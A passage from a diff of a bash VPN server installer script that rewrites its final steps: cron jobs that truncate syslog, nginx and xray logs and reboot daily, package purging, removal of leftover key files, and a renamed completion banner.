 */10 * * * * root truncate -s 0 /var/log/syslog \
@@ -376,43 +510,46 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
     && truncate -s 0 /var/log/nginx/access.log \
     && truncate -s 0 /var/log/xray/error.log \
     && truncate -s 0 /var/log/xray/access.log
-EOF
+END
 
-cat > /etc/cron.d/daily_reboot <<'EOF'
+cat >/etc/cron.d/daily_reboot <<-END
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 5 0 * * * root /sbin/reboot
-EOF
+END
 
-systemctl restart cron >/dev/null 2>&1 || true
-ok "Cron jobs installed"
+service cron restart >/dev/null 2>&1
+service cron reload >/dev/null 2>&1
+service cron start >/dev/null 2>&1
 
-# ---------------------------
-# 18) Cleanup & final tweaks
-# ---------------------------
-info "Cleaning up unused packages and files..."
-apt autoclean -y >/dev/null 2>&1 || true
-apt-get -y --purge remove samba* apache2* bind9* exim4 sendmail* >/dev/null 2>&1 || true
-apt autoremove -y >/dev/null 2>&1 || true
+# ───────────────────────────────────────────────────────
+# 🧹 REMOVE UNNECESSARY FILES
+# ───────────────────────────────────────────────────────
 
-chown -R www-data:www-data /home/vps/public_html || true
+apt autoclean -y >/dev/null 2>&1
+apt -y remove --purge unscd >/dev/null 2>&1
+apt-get -y --purge remove samba* >/dev/null 2>&1
+apt-get -y --purge remove apache2* >/dev/null 2>&1
+apt-get -y --purge remove bind9* >/dev/null 2>&1
+apt-get -y remove sendmail* >/dev/null 2>&1
+apt autoremove -y >/dev/null 2>&1
 
-# remove installer leftovers if present
-rm -f /root/key.pem /root/cert.pem /root/ssh-vpn.sh /root/bbr.sh 2>/dev/null || true
-rm -rf /etc/apache2 2>/dev/null || true
+# ───────────────────────────────────────────────────────
+# 🏁 FINISHING
+# ───────────────────────────────────────────────────────
+
+cd
+chown -R www-data:www-data /home/vps/public_html
+
+rm -f /root/key.pem
+rm -f /root/cert.pem
+rm -f /root/ssh-vpn.sh
+rm -f /root/bbr.sh
+rm -rf /etc/apache2
+
+# ╭──────────────────────────────────────────────────────╮
+# │              ✨ ANSENDANTVPN INSTALLER               │
+# │              ✓ SYSTEM SETUP COMPLETED                │
+# ╰──────────────────────────────────────────────────────╯
 
 clear
-echo
-echo -e "${GREEN}╔════════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${GREEN}║ ✅  D£VSX-NETWORK Bootstrap Completed                         ║${NC}"
-echo -e "${GREEN}║ ✅  Reboot recommended for kernel tweaks & swap activation    ║${NC}"
-echo -e "${GREEN}╚════════════════════════════════════════════════════════════════╝${NC}"
-echo
-echo -e "${CYAN}Summary:${NC}"
-echo -e "  - IP: ${YELLOW}${MYIP}${NC}"
-echo -e "  - Interface: ${YELLOW}${NET_IFACE}${NC}"
-echo -e "  - Web root: ${YELLOW}/home/vps/public_html${NC}"
-echo
-echo -e "${YELLOW}Tip:${NC} Check services with 'systemctl status haproxy nginx xray vnstat' and logs in /var/log/"
-echo
-
